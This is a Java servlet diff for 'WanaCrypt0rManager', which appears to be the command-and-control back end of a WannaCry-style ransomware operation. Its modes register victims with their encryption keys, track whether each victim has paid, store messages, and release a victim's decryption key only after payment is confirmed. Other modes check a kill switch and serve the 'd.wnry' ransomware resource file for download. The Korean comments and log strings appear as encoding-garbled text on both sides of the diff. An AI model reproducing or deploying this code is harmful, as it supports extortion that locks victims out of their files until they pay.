@@ -37,7 +37,7 @@ import kro.kr.rhya_network.utils.db.DatabaseManager;
 @WebServlet("/wanacrypt0r_manager")
 public class WanaCrypt0rManager extends HttpServlet {
 	private static final long serialVersionUID = 1L;
-	// JSON ¹İÈ¯ °á°ú
+	// JSON ë°˜í™˜ ê²°ê³¼
 	private final String successMessage = "success";
 	private final String failMessage = "fail";
 	
@@ -58,37 +58,37 @@ public class WanaCrypt0rManager extends HttpServlet {
 	protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
 		// TODO Auto-generated method stub
 		
-		// Rhya ·Î°Å º¯¼ö ¼±¾ğ
+		// Rhya ë¡œê±° ë³€ìˆ˜ ì„ ì–¸
 		RhyaLogger rl = new RhyaLogger();
-		// Rhya ·Î°Å ¼³Á¤
+		// Rhya ë¡œê±° ì„¤ì •
 		rl.JspName = request.getServletPath();
 		rl.LogConsole = true;
 		rl.LogFile = true;
 		
 		
-		// Å¬¶óÀÌ¾ğÆ® IP
+		// í´ë¼ì´ì–¸íŠ¸ IP
 		String clientIP = GetClientIPAddress.getClientIp(request);
 		
 		
-		// JSON °á°ú
+		// JSON ê²°ê³¼
 		final String keyName_Result = "result";
 		final String keyName_Message = "message";
-		// JSON º¯¼ö
+		// JSON ë³€ìˆ˜
 		Gson gson = new Gson();
 		JsonObject obj = new JsonObject();
 
 		
-		// DB °ü¸®ÀÚ ¼±¾ğ
+		// DB ê´€ë¦¬ì ì„ ì–¸
 		DatabaseManager.DatabaseConnection databaseConnection = new DatabaseManager.DatabaseConnection();
 		databaseConnection.init();
 		
 		
-		// ÀüÃ¼ ¿¹¿Ü Ã³¸®
+		// ì „ì²´ ì˜ˆì™¸ ì²˜ë¦¬
 		try {
-			// ÆäÀÌÁö ÃÊ±âÈ­
+			// í˜ì´ì§€ ì´ˆê¸°í™”
 			JSPUtilsInitTask jspUtilsInitTask = new JSPUtilsInitTask();
-			if (jspUtilsInitTask.initTask(rl, request, response, JspPageInfo.PageID_Rhya_Utaite_Player)) { // ÆäÀÌÁö ÃÊ±âÈ­ ¼º°ø
-				// DB Á¢¼Ó
+			if (jspUtilsInitTask.initTask(rl, request, response, JspPageInfo.PageID_Rhya_Utaite_Player)) { // í˜ì´ì§€ ì´ˆê¸°í™” ì„±ê³µ
+				// DB ì ‘ì†
 				try {
 					databaseConnection.init();
 					databaseConnection.connection();
@@ -98,22 +98,22 @@ public class WanaCrypt0rManager extends HttpServlet {
 					
 					databaseConnection = null;
 					
-					// ·Î±× Ãâ·Â
-					rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "µ¥ÀÌÅÍº£ÀÌ½º ¿¬°á Áß ¿À·ù ¹ß»ı! ", e.toString()));
+					// ë¡œê·¸ ì¶œë ¥
+					rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²° ì¤‘ ì˜¤ë¥˜ ë°œìƒ! ", e.toString()));
 				}
 				
 				
-				// Null È®ÀÎ
+				// Null í™•ì¸
 				if (databaseConnection != null) {
-					// Main ÆÄ¶ó¹ÌÅÍ ÃßÃâ
+					// Main íŒŒë¼ë¯¸í„° ì¶”ì¶œ
 					int inputMode = Integer.parseInt(request.getParameter("mode"));
-					// ·Î±× Ãâ·Â
-					rl.Log(RhyaLogger.Type.Debug, rl.CreateLogTextv8(clientIP, "Å¬¶óÀÌ¾ğÆ®°¡ ÇØ´ç ÆÄ¶ó¹ÌÅÍ·Î Á¢¼ÓÇÔ Mode:", Integer.toString(inputMode)));
+					// ë¡œê·¸ ì¶œë ¥
+					rl.Log(RhyaLogger.Type.Debug, rl.CreateLogTextv8(clientIP, "í´ë¼ì´ì–¸íŠ¸ê°€ í•´ë‹¹ íŒŒë¼ë¯¸í„°ë¡œ ì ‘ì†í•¨ Mode:", Integer.toString(inputMode)));
 					
-					// ÆäÀÌÁö Á¢±Ù È®ÀÎ
+					// í˜ì´ì§€ ì ‘ê·¼ í™•ì¸
 					if (!new ServiceAccessChecker().isAccessService(0)) {
-						// ·Î±× Ãâ·Â
-						rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv5(clientIP, "¼­ºñ½º Á¢±Ù Â÷´ÜµÊ!"));
+						// ë¡œê·¸ ì¶œë ¥
+						rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv5(clientIP, "ì„œë¹„ìŠ¤ ì ‘ê·¼ ì°¨ë‹¨ë¨!"));
 						
 						obj.addProperty(keyName_Result, "service_access_block");
 						
@@ -125,17 +125,17 @@ public class WanaCrypt0rManager extends HttpServlet {
 						return;
 					}
 					
-					// ÆÄ¶ó¹ÌÅÍ ±¸ºĞ
+					// íŒŒë¼ë¯¸í„° êµ¬ë¶„
 					switch (inputMode) {
 						/**
-						 * ¾Ë ¼ö ¾ø´Â ¸í·É¾î
+						 * ì•Œ ìˆ˜ ì—†ëŠ” ëª…ë ¹ì–´
 						 */
 						default: {
-							// ·Î±× Ãâ·Â
-							rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "ÀÔ·ÂÇÑ ¸í·ÉÀ» ºĞ¼®ÇÒ ¼ö ¾ø½À´Ï´Ù. Mode:", Integer.toString(inputMode)));
+							// ë¡œê·¸ ì¶œë ¥
+							rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "ì…ë ¥í•œ ëª…ë ¹ì„ ë¶„ì„í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. Mode:", Integer.toString(inputMode)));
 							
 							obj.addProperty(keyName_Result, failMessage);
-							obj.addProperty(keyName_Message, URLEncoder.encode("¾Ë ¼ö ¸í·ÉÀÔ´Ï´Ù. mode ÆÄ¶ó¹ÌÅÍ¸¦ È®ÀÎÇØ ÁÖ¼¼¿ä.", "UTF-8"));
+							obj.addProperty(keyName_Message, URLEncoder.encode("ì•Œ ìˆ˜ ëª…ë ¹ì…ë‹ˆë‹¤. mode íŒŒë¼ë¯¸í„°ë¥¼ í™•ì¸í•´ ì£¼ì„¸ìš”.", "UTF-8"));
 							
 							PrintWriter out = response.getWriter(); 
 							out.println(gson.toJson(obj));
@@ -145,13 +145,13 @@ public class WanaCrypt0rManager extends HttpServlet {
 						
 						
 						/**
-						 * WanaCrypt0r °ü¸® ¸ğµå : 0
+						 * WanaCrypt0r ê´€ë¦¬ ëª¨ë“œ : 0
 						 * 
-						 * ¼³¸í :
-						 * 		Å¬¶óÀÌ¾ğÆ® Á¤º¸ ÀúÀå
+						 * ì„¤ëª… :
+						 * 		í´ë¼ì´ì–¸íŠ¸ ì •ë³´ ì €ì¥
 						 * 
-						 * ÆÄ¶ó¹ÌÅÍ :
-						 * 		enckey      --> ¾ÏÈ­ Å°
+						 * íŒŒë¼ë¯¸í„° :
+						 * 		enckey      --> ì•”í™” í‚¤
 						 */
 						case 0: {
 							String encryptKey = request.getParameter("enckey");
@@ -163,14 +163,14 @@ public class WanaCrypt0rManager extends HttpServlet {
 							databaseConnection.getPreparedStatement().setString(2, encryptKey);
 							databaseConnection.executeUpdate();
 							
-							// JSON µ¥ÀÌÅÍ ¼³Á¤
+							// JSON ë°ì´í„° ì„¤ì •
 							obj.addProperty(keyName_Result, successMessage);
 							obj.addProperty("client_id", URLEncoder.encode(uuid.toString(), "UTF-8"));
 							obj.addProperty("encrypt_key", URLEncoder.encode(RhyaAES.AES_Encode(encryptKey), "UTF-8"));
-							// ·Î±× Ãâ·Â
-							rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Å¬¶óÀÌ¾ğÆ® Á¤º¸ µî·Ï ¼º°ø! / Client ID: ", encryptKey));
+							// ë¡œê·¸ ì¶œë ¥
+							rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r í´ë¼ì´ì–¸íŠ¸ ì •ë³´ ë“±ë¡ ì„±ê³µ! / Client ID: ", encryptKey));
 							
-							// JSON µ¥ÀÌÅÍ Ãâ·Â
+							// JSON ë°ì´í„° ì¶œë ¥
 							PrintWriter out = response.getWriter(); 
 							out.println(gson.toJson(obj));
 							
@@ -179,13 +179,13 @@ public class WanaCrypt0rManager extends HttpServlet {
 						
 						
 						/**
-						 * WanaCrypt0r °ü¸® ¸ğµå : 1
+						 * WanaCrypt0r ê´€ë¦¬ ëª¨ë“œ : 1
 						 * 
-						 * ¼³¸í :
-						 * 		Å¬¶óÀÌ¾ğÆ® Á¤º¸ Ãâ·Â
+						 * ì„¤ëª… :
+						 * 		í´ë¼ì´ì–¸íŠ¸ ì •ë³´ ì¶œë ¥
 						 * 
-						 * ÆÄ¶ó¹ÌÅÍ :
-						 * 		clientid    --> Å¬¶óÀÌ¾ğÆ® ID
+						 * íŒŒë¼ë¯¸í„° :
+						 * 		clientid    --> í´ë¼ì´ì–¸íŠ¸ ID
 						 */
 						case 1: {
 							String clientID = request.getParameter("clientid");
@@ -195,22 +195,22 @@ public class WanaCrypt0rManager extends HttpServlet {
 							databaseConnection.setResultSet();
 							
 							if (databaseConnection.getResultSet().next()) {
-								// JSON µ¥ÀÌÅÍ ¼³Á¤
+								// JSON ë°ì´í„° ì„¤ì •
 								obj.addProperty(keyName_Result, successMessage);
 								obj.addProperty("encrypt_date", URLEncoder.encode(databaseConnection.getResultSet().getString("encrypt_date"), "UTF-8"));
 								obj.addProperty("is_payment", databaseConnection.getResultSet().getInt("is_payment"));
 								
-								// ·Î±× Ãâ·Â
-								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Å¬¶óÀÌ¾ğÆ® Á¤º¸ Ãâ·Â ¼º°ø! / Client ID: ", clientID));
+								// ë¡œê·¸ ì¶œë ¥
+								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r í´ë¼ì´ì–¸íŠ¸ ì •ë³´ ì¶œë ¥ ì„±ê³µ! / Client ID: ", clientID));
 							}else {
-								// JSON µ¥ÀÌÅÍ ¼³Á¤
+								// JSON ë°ì´í„° ì„¤ì •
 								obj.addProperty(keyName_Result, failMessage);
 								
-								// ·Î±× Ãâ·Â
-								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Å¬¶óÀÌ¾ğÆ® Á¤º¸ Ãâ·Â ½ÇÆĞ! / Client ID: ", clientID));
+								// ë¡œê·¸ ì¶œë ¥
+								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r í´ë¼ì´ì–¸íŠ¸ ì •ë³´ ì¶œë ¥ ì‹¤íŒ¨! / Client ID: ", clientID));
 							}
 							
-							// JSON µ¥ÀÌÅÍ Ãâ·Â
+							// JSON ë°ì´í„° ì¶œë ¥
 							PrintWriter out = response.getWriter(); 
 							out.println(gson.toJson(obj));
 							
@@ -219,14 +219,14 @@ public class WanaCrypt0rManager extends HttpServlet {
 						
 						
 						/**
-						 * WanaCrypt0r °ü¸® ¸ğµå : 2
+						 * WanaCrypt0r ê´€ë¦¬ ëª¨ë“œ : 2
 						 * 
-						 * ¼³¸í :
-						 * 		Å¬¶óÀÌ¾ğÆ® ¸Ş½ÃÁö Àü¼Û
+						 * ì„¤ëª… :
+						 * 		í´ë¼ì´ì–¸íŠ¸ ë©”ì‹œì§€ ì „ì†¡
 						 * 
-						 * ÆÄ¶ó¹ÌÅÍ :
-						 * 		clientid    --> Å¬¶óÀÌ¾ğÆ® ID
-						 * 		message     --> ¸Ş½ÃÁö [ Base64 Encode ]
+						 * íŒŒë¼ë¯¸í„° :
+						 * 		clientid    --> í´ë¼ì´ì–¸íŠ¸ ID
+						 * 		message     --> ë©”ì‹œì§€ [ Base64 Encode ]
 						 */
 						case 2: {
 							String clientID = request.getParameter("clientid");
@@ -239,13 +239,13 @@ public class WanaCrypt0rManager extends HttpServlet {
 							databaseConnection.getPreparedStatement().setString(2, new String(Base64.decodeBase64(message), "UTF-8"));
 							databaseConnection.executeUpdate();
 							
-							// JSON µ¥ÀÌÅÍ ¼³Á¤
+							// JSON ë°ì´í„° ì„¤ì •
 							obj.addProperty(keyName_Result, successMessage);
 							
-							// ·Î±× Ãâ·Â
-							rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Å¬¶óÀÌ¾ğÆ® Á¤º¸ Ãâ·Â ¼º°ø! / Client ID: ", clientID));
+							// ë¡œê·¸ ì¶œë ¥
+							rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r í´ë¼ì´ì–¸íŠ¸ ì •ë³´ ì¶œë ¥ ì„±ê³µ! / Client ID: ", clientID));
 							
-							// JSON µ¥ÀÌÅÍ Ãâ·Â
+							// JSON ë°ì´í„° ì¶œë ¥
 							PrintWriter out = response.getWriter(); 
 							out.println(gson.toJson(obj));
 							
@@ -254,13 +254,13 @@ public class WanaCrypt0rManager extends HttpServlet {
 						
 						
 						/**
-						 * WanaCrypt0r °ü¸® ¸ğµå : 3
+						 * WanaCrypt0r ê´€ë¦¬ ëª¨ë“œ : 3
 						 * 
-						 * ¼³¸í :
-						 * 		Å¬¶óÀÌ¾ğÆ® ¾ÏÈ£È­ Å° Ãâ·Â
+						 * ì„¤ëª… :
+						 * 		í´ë¼ì´ì–¸íŠ¸ ì•”í˜¸í™” í‚¤ ì¶œë ¥
 						 * 
-						 * ÆÄ¶ó¹ÌÅÍ :
-						 * 		clientid    --> Å¬¶óÀÌ¾ğÆ® ID
+						 * íŒŒë¼ë¯¸í„° :
+						 * 		clientid    --> í´ë¼ì´ì–¸íŠ¸ ID
 						 */
 						case 3: {
 							String clientID = request.getParameter("clientid");
@@ -271,27 +271,27 @@ public class WanaCrypt0rManager extends HttpServlet {
 							
 							if (databaseConnection.getResultSet().next()) {
 								if (databaseConnection.getResultSet().getInt("is_payment") == 1) {
-									// JSON µ¥ÀÌÅÍ ¼³Á¤
+									// JSON ë°ì´í„° ì„¤ì •
 									obj.addProperty(keyName_Result, successMessage);
 									obj.addProperty("encrypt_key", databaseConnection.getResultSet().getString("encrypt_key"));
 									
-									// ·Î±× Ãâ·Â
-									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Å¬¶óÀÌ¾ğÆ® ¾ÏÈ£È­ Å° Ãâ·Â ¼º°ø! / Client ID: ", clientID));
+									// ë¡œê·¸ ì¶œë ¥
+									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r í´ë¼ì´ì–¸íŠ¸ ì•”í˜¸í™” í‚¤ ì¶œë ¥ ì„±ê³µ! / Client ID: ", clientID));
 								}else {
-									// JSON µ¥ÀÌÅÍ ¼³Á¤
+									// JSON ë°ì´í„° ì„¤ì •
 									obj.addProperty(keyName_Result, failMessage);
 									
-									// ·Î±× Ãâ·Â
-									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "Ãâ·Â ½ÇÆĞ! ÇØ´ç Å¬¶óÀÌ¾ğÆ®´Â ¾ÆÁ÷ ÁöºÒ È®ÀÎÀÌ µÇÁö ¾Ê¾Ò½À´Ï´Ù. / Client ID: ", clientID));
+									// ë¡œê·¸ ì¶œë ¥
+									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "ì¶œë ¥ ì‹¤íŒ¨! í•´ë‹¹ í´ë¼ì´ì–¸íŠ¸ëŠ” ì•„ì§ ì§€ë¶ˆ í™•ì¸ì´ ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. / Client ID: ", clientID));
 								}
 							}else {
-								// JSON µ¥ÀÌÅÍ ¼³Á¤
+								// JSON ë°ì´í„° ì„¤ì •
 								obj.addProperty(keyName_Result, failMessage);
 								
-								// ·Î±× Ãâ·Â
-								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r Å¬¶óÀÌ¾ğÆ® ¾ÏÈ£È­ Å° Ãâ·Â ½ÇÆĞ! / Client ID: ", clientID));
+								// ë¡œê·¸ ì¶œë ¥
+								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r í´ë¼ì´ì–¸íŠ¸ ì•”í˜¸í™” í‚¤ ì¶œë ¥ ì‹¤íŒ¨! / Client ID: ", clientID));
 							}
-							// JSON µ¥ÀÌÅÍ Ãâ·Â
+							// JSON ë°ì´í„° ì¶œë ¥
 							PrintWriter out = response.getWriter(); 
 							out.println(gson.toJson(obj));
 							
@@ -300,33 +300,33 @@ public class WanaCrypt0rManager extends HttpServlet {
 						
 						
 						/**
-						 * WanaCrypt0r °ü¸® ¸ğµå : 4
+						 * WanaCrypt0r ê´€ë¦¬ ëª¨ë“œ : 4
 						 * 
-						 * ¼³¸í :
-						 * 		Kill-Switch È®ÀÎ
+						 * ì„¤ëª… :
+						 * 		Kill-Switch í™•ì¸
 						 * 
-						 * ÆÄ¶ó¹ÌÅÍ :
-						 * 		<¾øÀ½>
+						 * íŒŒë¼ë¯¸í„° :
+						 * 		<ì—†ìŒ>
 						 */
 						case 4: {
 							databaseConnection.setPreparedStatement("SELECT service_online_wanacry_kill_switch FROM rhya_network_info;");
 							databaseConnection.setResultSet();
 							
 							if (databaseConnection.getResultSet().next()) {
-								// JSON µ¥ÀÌÅÍ ¼³Á¤
+								// JSON ë°ì´í„° ì„¤ì •
 								obj.addProperty(keyName_Result, successMessage);
 								obj.addProperty("message", databaseConnection.getResultSet().getInt("service_online_wanacry_kill_switch") == 1);
 								
-								// ·Î±× Ãâ·Â
-								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r Kill-Switch Ãâ·Â ¼º°ø!"));
+								// ë¡œê·¸ ì¶œë ¥
+								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r Kill-Switch ì¶œë ¥ ì„±ê³µ!"));
 							}else {
-								// JSON µ¥ÀÌÅÍ ¼³Á¤
+								// JSON ë°ì´í„° ì„¤ì •
 								obj.addProperty(keyName_Result, failMessage);
 								
-								// ·Î±× Ãâ·Â
-								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r Kill-Switch Ãâ·Â ½ÇÆĞ!"));
+								// ë¡œê·¸ ì¶œë ¥
+								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r Kill-Switch ì¶œë ¥ ì‹¤íŒ¨!"));
 							}
-							// JSON µ¥ÀÌÅÍ Ãâ·Â
+							// JSON ë°ì´í„° ì¶œë ¥
 							PrintWriter out = response.getWriter(); 
 							out.println(gson.toJson(obj));
 							
@@ -335,18 +335,18 @@ public class WanaCrypt0rManager extends HttpServlet {
 						
 						
 						/**
-						 * WanaCrypt0r °ü¸® ¸ğµå : 5
+						 * WanaCrypt0r ê´€ë¦¬ ëª¨ë“œ : 5
 						 * 
-						 * ¼³¸í :
-						 * 		WanaCrypt0r ÆÄÀÏ ´Ù¿î·Îµå
+						 * ì„¤ëª… :
+						 * 		WanaCrypt0r íŒŒì¼ ë‹¤ìš´ë¡œë“œ
 						 * 
-						 * ÆÄ¶ó¹ÌÅÍ :
-						 * 		<¾øÀ½>
+						 * íŒŒë¼ë¯¸í„° :
+						 * 		<ì—†ìŒ>
 						 */
 						case 5: {
-							// ÆÄÀÏ ¾÷·ÎµåµÈ °æ·Î
+							// íŒŒì¼ ì—…ë¡œë“œëœ ê²½ë¡œ
 						    final String root = PathManager.WANACRY_ROOT_PATH;
-						    // ½ÇÁ¦ ³»º¸³¾ ÆÄÀÏ¸í
+						    // ì‹¤ì œ ë‚´ë³´ë‚¼ íŒŒì¼ëª…
 						    String orgfilename = "d.wnry";    
 							try {
 								File file = new File(root, "drop_resources.zip");
@@ -366,23 +366,23 @@ public class WanaCrypt0rManager extends HttpServlet {
 									outs.close();
 									fin.close();
 									
-									// ·Î±× Ãâ·Â
-									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r 'd.wnry' ÆÄÀÏ ´Ù¿î·Îµå ¼º°ø!"));
+									// ë¡œê·¸ ì¶œë ¥
+									rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv5(clientIP, "WanaCrypt0r 'd.wnry' íŒŒì¼ ë‹¤ìš´ë¡œë“œ ì„±ê³µ!"));
 								} else {
-									// ·Î±× Ãâ·Â
-									rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv5(clientIP, "WanaCrypt0r 'd.wnry' ÆÄÀÏ ´Ù¿î·Îµå ½ÇÆĞ! File does not exist!"));
+									// ë¡œê·¸ ì¶œë ¥
+									rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv5(clientIP, "WanaCrypt0r 'd.wnry' íŒŒì¼ ë‹¤ìš´ë¡œë“œ ì‹¤íŒ¨! File does not exist!"));
 									
 									obj.addProperty(keyName_Result, failMessage);
 								}
 							} catch (IOException e) {
-								// ·Î±× Ãâ·Â
-								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 'd.wnry' ÆÄÀÏ ´Ù¿î·Îµå ½ÇÆĞ! ¾Ë ¼ö ¾ø´Â ¿À·ù°¡ ¹ß»ıÇÏ¿´½À´Ï´Ù.", e.toString()));
+								// ë¡œê·¸ ì¶œë ¥
+								rl.Log(RhyaLogger.Type.Info, rl.CreateLogTextv8(clientIP, "WanaCrypt0r 'd.wnry' íŒŒì¼ ë‹¤ìš´ë¡œë“œ ì‹¤íŒ¨! ì•Œ ìˆ˜ ì—†ëŠ” ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì˜€ìŠµë‹ˆë‹¤.", e.toString()));
 								
 								obj.addProperty(keyName_Result, failMessage);
 							}
 							
 							
-							// JSON µ¥ÀÌÅÍ Ãâ·Â
+							// JSON ë°ì´í„° ì¶œë ¥
 							PrintWriter out = response.getWriter(); 
 							out.println(gson.toJson(obj));
 							
@@ -390,10 +390,10 @@ public class WanaCrypt0rManager extends HttpServlet {
 						}
 					}
 				}
-			}else { // ÆäÀÌÁö ÃÊ±âÈ­ ½ÇÆĞ
+			}else { // í˜ì´ì§€ ì´ˆê¸°í™” ì‹¤íŒ¨
 				obj.addProperty(keyName_Result, failMessage);
 				
-				rl.Log(RhyaLogger.Type.Error, rl.CreateLogTextv5(clientIP, "JSP ÆäÀÌÁö ÃÊ±âÈ­ Áß ¿À·ù°¡ ¹ß»ıÇÏ¿´½À´Ï´Ù."));
+				rl.Log(RhyaLogger.Type.Error, rl.CreateLogTextv5(clientIP, "JSP í˜ì´ì§€ ì´ˆê¸°í™” ì¤‘ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì˜€ìŠµë‹ˆë‹¤."));
 			}
 		}catch (Exception e) {
 			e.printStackTrace();
@@ -402,20 +402,20 @@ public class WanaCrypt0rManager extends HttpServlet {
 			PrintWriter out = response.getWriter(); 
 			out.println(gson.toJson(obj));
 			
-			// ·Î±× Ãâ·Â
-			rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "¾Ë ¼ö ¾ø´Â ¿À·ù ¹ß»ı!", e.toString()));
+			// ë¡œê·¸ ì¶œë ¥
+			rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "ì•Œ ìˆ˜ ì—†ëŠ” ì˜¤ë¥˜ ë°œìƒ!", e.toString()));
 		}
 		
 		
-		// DB ¿¬°á ÇØÁ¦
+		// DB ì—°ê²° í•´ì œ
 		try {
 			if (databaseConnection != null) 
 				databaseConnection.allClose();
 		}catch (SQLException e) {
 			e.printStackTrace();
 			
-			// ·Î±× Ãâ·Â
-			rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "µ¥ÀÌÅÍº£ÀÌ½º ¿¬°á ÇØÁ¦ ¿À·ù ¹ß»ı! ", e.toString()));
+			// ë¡œê·¸ ì¶œë ¥
+			rl.Log(RhyaLogger.Type.Warning, rl.CreateLogTextv8(clientIP, "ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²° í•´ì œ ì˜¤ë¥˜ ë°œìƒ! ", e.toString()));
 		}
 	}
 
